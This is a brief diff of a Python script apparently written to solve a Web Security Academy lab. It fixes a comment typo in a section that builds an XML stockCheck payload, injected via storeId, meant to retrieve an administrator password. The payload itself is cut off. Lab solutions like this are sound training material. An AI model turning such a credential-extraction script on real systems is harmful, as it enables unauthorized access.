@@ -34,7 +34,7 @@ url = "https://0af80068031e1d5d820d1a8a00d4007a.web-security-academy.net"
 
 print(Fore.BLUE + "[#] Injection point: " + Fore.YELLOW + "storeId")
 
-# payload to retreive administrator password
+# payload to retrieve administrator password
 payload = """<?xml version="1.0" encoding="UTF-8"?>
 <stockCheck>
     <productId>
